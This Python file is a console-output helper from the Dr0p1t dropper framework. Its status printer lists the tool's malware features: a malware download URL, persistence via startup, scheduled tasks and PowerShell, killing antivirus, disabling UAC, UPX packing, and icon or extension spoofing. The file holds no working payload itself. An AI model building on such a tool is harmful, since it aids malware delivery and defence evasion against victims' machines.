#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
import sys
from os.path import *
global G, Y, B, R, W , M , C , end

def set_colors():
	global G, Y, B, R, W , M , C , end
	if sys.platform.startswith('win'):
		# Windows deserve coloring too :D
		try:
			import win_unicode_console , colorama
			win_unicode_console.enable()
			colorama.init()
			#Now the unicode will work ^_^
			G = '\033[92m'  # green
			Y = '\033[93m'  # yellow
			B = '\033[94m'  # blue
			R = '\033[91m'  # red
			W = '\033[0m'   # white
			M = '\x1b[35m'  # magenta
			C = '\x1b[36m'  # cyan
			end = '\33[97m'
		except:
			#print("[!] Error: Coloring libraries not installed ,no coloring will be used [Check the readme]")
			G = Y = B = R = W = G = Y = B = R = W = ''
	else:
		G = '\033[92m'  # green
		Y = '\033[93m'  # yellow
		B = '\033[94m'  # blue
		R = '\033[91m'  # red
		W = '\033[0m'   # white
		M = '\x1b[35m'  # magenta
		C = '\x1b[36m'  # cyan
		end = '\33[97m'

set_colors()
# Console Colors
def colored_print(text,color):
	global G, Y, B, R, W , M , C , end
	def cprint(text,color,end=end ):
		print(color+text+end)
	if color.lower()=="g":color=G
	elif color.lower()=="y":color=Y
	elif color.lower()=="b":color=B
	elif color.lower()=="r":color=R
	elif color.lower()=="w":color=W
	elif color.lower()=="m":color=M
	elif color.lower()=="c":color=C
	cprint( text, color, end )

def print_banner(banner,info,c1,c2):
	global G, Y, B, R, W , M , C , end
	end = '\33[97m'
	def cprint(text,info,c1,c2):
		print(c1+text+end)
		print(c2+info+end)
	cprint( banner,info,c1,c2 )

def warn():
	global G, Y, B, R, W , M , C , end
	return '''{} # Disclaimer Alert #{}
  Dr0p1t Framework not responsible
    for misuse or illegal purposes. {}
      Use it only for {}work{} or {} educational purpose {} !!!'''.format(R,B,Y,R,Y,R,W)

def print_status(args):
	global G, Y, B, R, W , M , C , end
	set_colors() # because of some non logical error on some users devices :3
	if args.s:
		c1,a = G," Loaded "
	else:
		c1,a = R,"Unloaded"

	if args.t:
		c2,b = G," Loaded "
	else:
		c2,b = R,"Unloaded"

	if args.k:
		c3,c = G," Loaded "
	else:
		c3,c = R,"Unloaded"

	if args.b:
		c4,d    = G," Loaded "
		cx1,bat = M,args.b
	else:
		c4,d = R,"Unloaded"
		cx1,bat = Y,"None"

	if args.p:
		c5,e = G," Loaded "
		cx2,ps1 = M,args.p
	else:
		c5,e = R,"Unloaded"
		cx2,ps1 = Y,"None"

	if args.v:
		c6,f = G," Loaded "
		cx3,vbs = M,args.v
	else:
		c6,f = R,"Unloaded"
		cx3,vbs = Y,"None"

	if args.upx:
		c7,g = G," Loaded "
	else:
		c7,g = R,"Unloaded"

	if args.nouac:
		c8,h = G," Loaded "
	else:
		c8,h = R,"Unloaded"

	if args.a:
		c9,i = G," Loaded "
	else:
		c9,i = R,"Unloaded"

	if args.runas:
		c10,j = G," Loaded "
	else:
		c10,j = R,"Unloaded"

	if args.spoof:
		c11,k = G," Loaded "
		cx4,ext=M,args.spoof
	else:
		c11,k = R,"Unloaded"
		cx4,ext=Y,"None"

	if args.i:
		c12,l = G," Loaded "
		cx5,ico=M,args.i
	else:
		c12,l = R,"Unloaded"
		cx5,ico=Y,args.i


	print("\n"+Y+"[+] "+W+"Malware url : "+B+"%s"%args.url+W+
	"\n"+Y+"\n[+] "+W+"Modules :"+
	"\n\tStartup persistence\t: "+c1+"[%s]"%a+W+
	"\n\tTask persistence\t: "+c2+"[%s]"%b+W+
	"\n\tPowershell persistence\t: "+c9+"[%s]"%i+W+ #jklmn
	"\n\tKill antivirus\t\t: "+c3+"[%s]"%c+W+
	"\n\tDisable UAC\t\t: "+c8+"[%s]"%h+W+
	"\n\tRun as admin\t\t: "+c10+"[%s]"%j+W+
	"\n\tCompress with UPX\t: "+c7+"[%s]"%g+W+

	"\n"+Y+"\n[+] "+W+"Scripts :"+
	"\n\tBAT file : "+cx1+"%s"%bat+W+
	"\n\tPS1 file : "+cx2+"%s"%ps1+W+
	"\n\tVBS file : "+cx3+"%s"%vbs+W+"\n"+

	"\n"+Y+"\n[+] "+W+"Spoofing :"+
	"\n\tIcon spoof \t: "+cx5+"%s"%ico+W+
	"\n\tExtension spoof : "+cx4+"%s"%ext+W+"\n"
	)
